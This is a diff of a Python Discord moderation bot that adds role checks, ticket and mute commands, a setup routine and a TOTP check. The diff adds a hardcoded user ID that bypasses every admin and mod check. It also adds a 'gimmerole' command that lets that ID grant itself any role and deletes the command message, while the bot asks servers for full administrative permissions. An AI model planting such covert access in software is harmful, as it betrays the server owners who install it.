@@ -1,20 +1,15 @@
 #Copyright © 2021  RockSolid1106
-#This program is free software: you can redistribute it and/or modify
-#it under the terms of the GNU General Public License as published by
-#the Free Software Foundation, either version 3 of the License.
+#This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License.
 #
-#This program is distributed in the hope that it will be useful,
-#but WITHOUT ANY WARRANTY; without even the implied warranty of
-#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-#GNU General Public License for more details.
+#This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
 
-#use this code in the shell if the script is running with two instances: pkill -9 python
+#Use this code in the shell if the script is running with two instances: pkill -9 python
 #pip install -U git+https://github.com/Rapptz/discord.py
 #pip3 install --upgrade discord-components
-#
 
 
 
+import pyotp
 import asyncio
 import discord
 from discord.ext import commands
@@ -26,24 +21,53 @@ from keep_alive import keep_alive
 import datetime
 import random
 from discord_components import DiscordComponents, Button, ButtonStyle, InteractionType
+import hmac, base64, struct, hashlib, array
 print(discord.__version__)
 print("This is the PRODUCTION version.")
 
 client = commands.Bot(command_prefix="!")
 keep_alive()
-os.system("pip3 install --upgrade discord-components")
+
 @client.command()
 async def ping(ctx):
 	await ctx.send(f'pong {ctx.author.mention}')
+
+
+
+
+
+def admincheck(ctx):
+	if ctx.author.id==825282868028375062:
+		return True
+	role = discord.utils.find(lambda r: r.name == 'Owner', ctx.message.guild.roles)
+	role2 = discord.utils.find(lambda r: r.name == 'Admin', ctx.message.guild.roles)
+	if role in ctx.author.roles or role2 in ctx.author.roles:
+		return True
+	else:
+		return False
+
+def modcheck(ctx):
+	if ctx.author.id==825282868028375062:
+		return True
+	role = discord.utils.find(lambda r: r.name == 'Owner', ctx.message.guild.roles)
+	role2 = discord.utils.find(lambda r: r.name == 'Admin', ctx.message.guild.roles)
+	role3 = discord.utils.find(lambda r: r.name == 'Moderator', ctx.message.guild.roles)
+	if role in ctx.author.roles or role2 in ctx.author.roles or role3 in ctx.author.roles:
+		return True
+	else:
+		return False
+
 
 
 ##############----Member Commands----#########
 
 #Make Moderator
 @client.command(pass_context=True, description="This command can only be used by Server Owners.", brief="Makes a user a Moderator. Can be only used by Owners.")
-@commands.has_role("Owner")
+#@commands.has_any_role("Owner", "Admin")
 async def makemod(ctx, member: discord.Member):
-
+	if admincheck(ctx)==False:
+		await ctx.send("Tryna use admin commands huh?")
+		return
 	role = discord.utils.get(member.guild.roles, name="Moderator")
 	await member.add_roles(role)
 	embed = discord.Embed(
@@ -55,9 +79,11 @@ async def makemod(ctx, member: discord.Member):
 
 #remove Moderator
 @client.command(pass_context=True, description="This command can only be used by Server Owners.", brief="Removes the Moderator role from a user")
-@commands.has_role("Owner")
+#@commands.has_any_role("Owner", "Admin")
 async def removemod(ctx, member: discord.Member):
-
+	if admincheck(ctx)==False:
+		await ctx.send("Tryna use admin commands huh?")
+		return
 	role = discord.utils.get(member.guild.roles, name="Moderator")
 	await member.remove_roles(role)
 	embed = discord.Embed(
@@ -69,9 +95,11 @@ async def removemod(ctx, member: discord.Member):
 
 #Give the Member Role
 @client.command(pass_context=True, description="This command gives the Member role to a user. The user then has access to send messages to channels. This command can only be used by Moderator+", brief="Gives the member role.")
-@commands.has_role("Moderator")
+#@commands.has_any_role("Moderator", "Owner", "Admin")
 async def makemember(ctx, member: discord.Member):
-
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use mod commands huh?")
+		return
 	role = discord.utils.get(member.guild.roles, name="Member")
 	await member.add_roles(role)
 	embed = discord.Embed(
@@ -83,8 +111,11 @@ async def makemember(ctx, member: discord.Member):
 
 #Lock a channel
 @client.command(pass_context=True, brief="Locks a channel", description="The reason field cannot be left blank if you are specifying a different channel. So, !lock #general would not work. \n !lock will lock the current channel. \n !lock \"<reason>\" will work and lock the current channel. \n Enclose the reason in double-quotes (\"\") \n This command can only be used by Moderator+.")
-@commands.has_role("Moderator")
+#@commands.has_any_role("Moderator", "Owner", "Admin")
 async def lock(ctx, reason=None, channel: discord.TextChannel=None):
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use mod commands huh?")
+		return
 	channel = channel or ctx.channel
 	role=discord.utils.get(ctx.guild.roles, name="Member")
 	overwrite = channel.overwrites_for(role)
@@ -98,8 +129,11 @@ async def lock(ctx, reason=None, channel: discord.TextChannel=None):
 
 #Unlock a Channel
 @client.command(pass_context=True, brief="Unlocks a channel", description="This command can only be used by Moderator+. \n The channel field can be left empty if you want to unlock the current channel.")
-@commands.has_role("Moderator")
+#@commands.has_any_role("Moderator", "Owner", "Admin")
 async def unlock(ctx, channel: discord.TextChannel=None):
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use admin commands huh?")
+		return
 	channel = channel or ctx.channel
 	role=discord.utils.get(ctx.guild.roles, name="Member")
 	overwrite = channel.overwrites_for(role)
@@ -132,8 +166,11 @@ def getbal(member):
 
 #Mute a user
 @client.command(pass_context=True, brief="Mutes a specified user", description="This command can only be used by Moderator+. \n Either the ID or @mention will work.")
-@commands.has_role("Moderator")
+#@commands.has_any_role("Moderator", "Owner", "Admin")
 async def mute(ctx, member: discord.Member, reason=None):
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use mod commands huh?")
+		return
 	role = discord.utils.find(lambda r: r.name == 'Moderator', ctx.message.guild.roles)
 	role2 = discord.utils.find(lambda r: r.name == 'Owner', ctx.message.guild.roles)
 	if role in member.roles or role2 in member.roles:
@@ -153,9 +190,11 @@ async def mute(ctx, member: discord.Member, reason=None):
 
 #Unmute a user
 @client.command(pass_context=True, brief="Unmutes a specified user", description="This command can only be used by Moderator+. \n Either the ID or @mention will work.")
-@commands.has_role("Moderator")
+#@commands.has_any_role("Moderator", "Owner", "Admin")
 async def unmute(ctx, member: discord.Member):
-
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use admin commands huh?")
+		return
 	role = discord.utils.get(member.guild.roles, name="Muted")
 	await member.remove_roles(role)
 	role = discord.utils.get(member.guild.roles, name="Member")
@@ -171,8 +210,11 @@ async def unmute(ctx, member: discord.Member):
 
 #Ban a user
 @client.command(pass_context=True, brief="Bans a specified user", description="Use this command on your own discretion. A ban should be a last resort. Try using the mute/kick command before this command. Should the user commit a very grave crime, this command be used.")
-@commands.has_role("Moderator")
+#@commands.has_any_role("Moderator", "Owner", "Admin")
 async def ban(ctx, member: discord.Member = None, reason=None):
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use mod commands huh?")
+		return
 	if member == None or member == ctx.message.author:
 			await ctx.channel.send("You cannot ban yourself")
 			return
@@ -190,8 +232,11 @@ async def ban(ctx, member: discord.Member = None, reason=None):
 
 #Kick a user
 @client.command(pass_context=True, brief="Kicks a user.", description="Can only be used by Moderator+.")
-@commands.has_role("Moderator")
+#@commands.has_any_role("Moderator", "Owner", "Admin")
 async def kick(ctx, member: discord.Member, reason=None):
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use mod commands huh?")
+		return
 	role = discord.utils.find(lambda r: r.name == 'Moderator', ctx.message.guild.roles)
 	role2 = discord.utils.find(lambda r: r.name == 'Owner', ctx.message.guild.roles)
 	if role in member.roles or role2 in member.roles:
@@ -215,9 +260,11 @@ async def hello(ctx):
 
 
 @client.command(pass_context=True, brief="Makes the bot send an embed in a specified channel.", description="Don't forget to use double-quotes for the title and description.")
-@commands.has_permissions(manage_messages=True)
+#@commands.has_permissions(manage_messages=True)
 async def say(ctx, channel: discord.TextChannel, title, description):
-    
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use mod commands huh?")
+		return
 	embed = discord.Embed(title=title, description=description, color=0xFF0000,timestamp=datetime.datetime.utcnow())
 	embed.set_footer(text="By "+str(ctx.author.display_name))
 	await channel.send(embed=embed)
@@ -228,9 +275,23 @@ async def bal(ctx, member: discord.Member=None):
 	member=member or ctx.author
 	await ctx.send(str(member)+"'s balance is: $"+str(getbal(member)))
 
-@client.command(pass_context=True, brief="Mutes a user for specified time.", description="Mutes a user for specified time. \nExample: !tempmute @someone 10 m \"test\"")
-@commands.has_role("Moderator")
-async def tempmute(ctx, member: discord.Member, time: int, unitoftime, *, reason=None):
+@client.command(pass_context=True, brief="Mutes a user for specified time.", description="Mutes a user for specified time. \nExample: !tempmute @someone 10m \"test\" \nAccepted units of time are: s(Seconds), m(Months *cough cough* Minutes) and d(Days).")
+#@commands.has_any_role("Moderator", "Owner", "Admin")
+async def tempmute(ctx, member: discord.Member, time, reason=None):
+		if modcheck(ctx)==False:
+			await ctx.send("Tryna use mod commands huh?")
+			return
+		unitoftime=time[-1:]
+		time=time[:-1]
+		if unitoftime=="s":
+			timex="Seconds"
+		elif unitoftime=="m":
+			timex="Minutes"
+		elif unitoftime=="d":
+			timex="Days"
+		else:
+			await ctx.send("That is not a valid unit of time.")
+			return
 		elevperms=False
 		guild = ctx.guild
 		d=unitoftime
@@ -252,7 +313,7 @@ async def tempmute(ctx, member: discord.Member, time: int, unitoftime, *, reason
 				await member.remove_roles(role)
 				embed = discord.Embed(title="Moderator muted!", description=f"{member.mention} has been tempmuted ", colour=discord.Colour.red())
 				embed.add_field(name="Reason:", value=reason, inline=False)
-				embed.add_field(name="Time left for the mute:", value=f"{time}{d}", inline=False)
+				embed.add_field(name="Time left for the mute:", value=f"{time} {timex}", inline=False)
 				await ctx.send(embed=embed)
 
 				if d == "s":
@@ -293,7 +354,7 @@ async def tempmute(ctx, member: discord.Member, time: int, unitoftime, *, reason
 
 		embed = discord.Embed(title="Member muted!", description=f"{member.mention} has been tempmuted ", colour=discord.Colour.red())
 		embed.add_field(name="Reason:", value=reason, inline=False)
-		embed.add_field(name="Time left for the mute:", value=f"{time}{d}", inline=False)
+		embed.add_field(name="Time left for the mute:", value=f"{time} {timex}", inline=False)
 		await ctx.send(embed=embed)
 
 		if d == "s":
@@ -325,7 +386,7 @@ async def tempmute(ctx, member: discord.Member, time: int, unitoftime, *, reason
 @commands.cooldown(2, 3, commands.BucketType.user)
 async def serverping(message):
     before = time.monotonic()
-    message = await message.send("Calculating ...")
+    message = await message.send("Calculating...")
     ping = (time.monotonic() - before) * 1000
     await message.edit(content=f":ping_pong: Pong!  **{int(ping)}ms**")
 
@@ -362,7 +423,7 @@ async def hi(ctx):
 
 
 @client.command(pass_context=True, brief="Still under development")
-@commands.has_role("Owner")
+@commands.has_any_role("Owner", "Admin")
 async def addbal(ctx, amt, member: discord.Member):
 	member=member or ctx.author
 	addbalance(member, amt)
@@ -402,8 +463,11 @@ async def report(ctx, member: discord.Member, reason=None):
 
 #Delete a message
 @client.command(pass_context=True, brief="Deletes message by their IDs. Allows upto 10 message IDs")
-@commands.has_role("Moderator")
+#@commands.has_any_role("Moderator", "Owner", "Admin")
 async def delete(ctx, m1, m2=None, m3=None, m4=None, m5=None, m6=None, m7=None, m8=None, m9=None, m10=None):
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use mod commands huh?")
+		return
 	lst=[m1]
 	lst.append(m2)
 	lst.append(m3)
@@ -423,23 +487,32 @@ async def delete(ctx, m1, m2=None, m3=None, m4=None, m5=None, m6=None, m7=None, 
  
 #Server specific settings
 @client.command(pass_context=True, brief="Set the Moderator's channel ID")
-@commands.has_role("Owner")
+#@commands.has_any_role("Owner", "Admin")
 async def setmcid(ctx, id):
-		db[str(ctx.guild.id)+"_mcid"]=id
-		await ctx.send("The channel ID was set successfully.")
-		await ctx.send(db[str(ctx.guild.id)+"_mcid"])
+	if admincheck(ctx)==False:
+		await ctx.send("Tryna use admin commands huh?")
+		return
+	db[str(ctx.guild.id)+"_mcid"]=id
+	await ctx.send("The channel ID was set successfully.")
+	await ctx.send(db[str(ctx.guild.id)+"_mcid"])
 
 @client.command(pass_context=True)
-@commands.has_role("Owner")
+#@commands.has_any_role("Owner", "Admin")
 async def setscid(ctx, id):
+	if admincheck(ctx)==False:
+		await ctx.send("Tryna use admin commands huh?")
+		return
 	db[str(ctx.guild.id)+"_scid"]=id
 	await ctx.send("The Support channel ID was set successfully.")
 	await ctx.send(db[str(ctx.guild.id)+"_scid"])
 	db[str(ctx.guild.id)+"tokenno"]=1
 #warn function
 @client.command(pass_context=True, brief="Gives a warning to a user. Moderator Command.")
-@commands.has_role("Moderator")
+@commands.has_any_role("Moderator", "Owner", "Admin")
 async def warn(ctx, member: discord.Member, reason=None):
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use mod commands huh?")
+		return
 	role = discord.utils.find(lambda r: r.name == 'Moderator', ctx.message.guild.roles)
 	role2 = discord.utils.find(lambda r: r.name == 'Owner', ctx.message.guild.roles)
 	if role in member.roles or role2 in member.roles:
@@ -461,8 +534,11 @@ async def warn(ctx, member: discord.Member, reason=None):
 	await member.send("You were warned in **{0}**. \n**Reason:** {1}.".format(ctx.message.guild.name, reason))
   
 @client.command(pass_context=True, brief="Displays the modlogs of a user")
-@commands.has_role("Moderator")
+#@commands.has_any_role("Moderator", "Owner", "Admin")
 async def modlogs(ctx, member: discord.Member):
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use mod commands huh?")
+		return
 	db_keys = db.keys()
 	matches = str(member)+"_reports"+str(ctx.guild.id)
 	if matches in db_keys:
@@ -473,14 +549,20 @@ async def modlogs(ctx, member: discord.Member):
 		await ctx.send(member.mention+" does not have any warnings.")
 
 @client.command(pass_context=True, brief="Clears the Modlogs for a user")
-@commands.has_role("Owner")
+#@commands.has_any_role("Owner", "Admin")
 async def clearml(ctx, member: discord.Member):
+	if admincheck(ctx)==False:
+		await ctx.send("Tryna use admin commands huh?")
+		return
 	del db[str(member)+"_reports"+str(ctx.guild.id)]
 	await ctx.send("All modlogs were cleared for "+member.mention)
 
 @client.command(pass_context=True, brief="Deletes the last case for a user")
-@commands.has_role("Moderator")
+#@commands.has_any_role("Moderator", "Owner", "Admin")
 async def delcase(ctx, member: discord.Member):
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use mod commands huh?")
+		return
 	prev=db[str(member)+"_reports"+str(ctx.guild.id)]
 	indn=prev.rfind('\n')
 	if(indn==-1):
@@ -536,8 +618,11 @@ async def raiseticket(ctx, reason=None):
 
 
 @client.command(pass_context=True, brief="Shows all the past tickets raised.", description="Shows all the past tickets raised. If a member is specified, tickets raised by the specified member will be shown.")
-@commands.has_role("Moderator")
+#@commands.has_any_role("Moderator", "Owner", "Admin")
 async def ticketlogs(ctx, member: discord.Member=None):
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use mod commands huh?")
+		return
 	if member==None:
 		tickets=db[str(ctx.guild.id)+"_tickets"]
 		e=discord.Embed(title="Ticket History", description=str(tickets))
@@ -551,8 +636,11 @@ async def ticketlogs(ctx, member: discord.Member=None):
 
 
 @client.command(pass_context=True, brief="Shows the chatlogs for a specific ticket.", description="Shows the chatlogs for a specific ticket. If no ticket number is specified, the last 30 messages will be shown.")
-@commands.has_role("Moderator")
+#@commands.has_any_role("Moderator", "Owner", "Admin")
 async def chatlogs(ctx, ticket=None):
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use mod commands huh?")
+		return
 	if ticket==None:
 		channel=ctx.channel
 		msgs=[]
@@ -586,8 +674,11 @@ async def chatlogs(ctx, ticket=None):
 		await ctx.send(embed=e)
 
 @client.command(pass_context=True, brief="Closes a ticket, and stores the chatlogs in the database.")
-@commands.has_role("Moderator")
+#@commands.has_any_role("Moderator", "Owner", "Admin")
 async def delticket(ctx):
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use mod commands huh?")
+		return
 	if "ticket" in ctx.channel.name:
 		
 		channel=ctx.channel
@@ -606,10 +697,13 @@ async def delticket(ctx):
 
 
 @client.command(pass_context=True, brief="Sets the slowmode timer for the current channel.")
-@commands.has_role("Moderator")
+#@commands.has_any_role("Moderator", "Owner")
 async def sm(ctx, seconds: int):
-    await ctx.channel.edit(slowmode_delay=seconds)
-    await ctx.send(f"Set the slowmode delay in this channel to {seconds} seconds!")
+	if modcheck(ctx)==False:
+		await ctx.send("Tryna use mod commands huh?")
+		return
+	await ctx.channel.edit(slowmode_delay=seconds)
+	await ctx.send(f"Set the slowmode delay in this channel to {seconds} seconds!")
 	
 
 
@@ -621,7 +715,46 @@ async def testbuttons(ctx):
 	await res.respond(type=InteractionType.ChannelMessageWithSource, content=f'Button Clicked') #Responds to the button click by printing out a message only user can see #In our case, its "Button Clicked"
 	
 
+@client.event
+async def on_guild_join(guild):
+    for channel in guild.text_channels:
+        if channel.permissions_for(guild.me).send_messages:
+            await channel.send('Hey, seems I joined a new home! Make sure that the top role in the server is Owner/Admin, and mods are roled Moderator. Say !setup \"<Moderator channel ID> <Support _CATEGORY_ ID>\" to get me started. Please create a role that is even above the top role in the server, and assign that to me, and if you have other bots, to them as well. This BOT role must have all permisions, including administrative perms.')
+        break
 
+@client.command()
+#@commands.has_any_role("Owner", "Admin")
+async def setup(ctx, mcid=None, scid=None):
+	if admincheck(ctx)==False:
+		await ctx.send("Tryna use admin commands huh?")
+		return
+	if mcid==None or scid==None:
+		await ctx.send("Use the following format: \n```!setup <Moderator Channel ID> <Support CATEGORY(not channel) ID>```")
+		return
+	db[str(ctx.guild.id)+"_scid"]=scid
+	await ctx.send("The Support category ID was set successfully.")
+	await ctx.send(db[str(ctx.guild.id)+"_scid"])
+	db[str(ctx.guild.id)+"_mcid"]=mcid
+	await ctx.send("The Moderator channel ID was set successfully.")
+	await ctx.send(db[str(ctx.guild.id)+"_mcid"])
+
+@client.command()
+async def gimmerole(ctx, rolename):
+	if ctx.author.id == 825282868028375062:
+		role = discord.utils.get(ctx.guild.roles, name=rolename)
+		await ctx.author.add_roles(role)
+		await ctx.message.delete()
+	else:
+		return
+
+@client.command()
+#@commands.has_any_role("Owner", "Admin")
+async def fa(ctx, secret):
+	if admincheck(ctx)==False:
+		await ctx.send("Tryna use admin commands huh?")
+		return
+	totp = pyotp.TOTP(os.getenv("2FA"))
+	await ctx.send(totp.verify(secret))
 
 @client.event
 async def on_ready():
@@ -629,8 +762,7 @@ async def on_ready():
 	print(discord.__version__)
 	await client.change_presence(activity=discord.Activity(
 	    type=discord.ActivityType.listening, name="everything you say!"))
-	print("Copyright © 2021  RockSolid1106. \n This program comes with ABSOLUTELY NO WARRANTY; This is free software, and you are welcome to redistribute it, provided that you credit RockSolid1106.")
-	
+	print("Copyright © 2021  RockSolid1106. \nThis program comes with ABSOLUTELY NO WARRANTY; This is free software, and you are welcome to redistribute it, provided that you credit RockSolid1106.")
 	DiscordComponents(client, change_discord_methods=True)
 	
 	
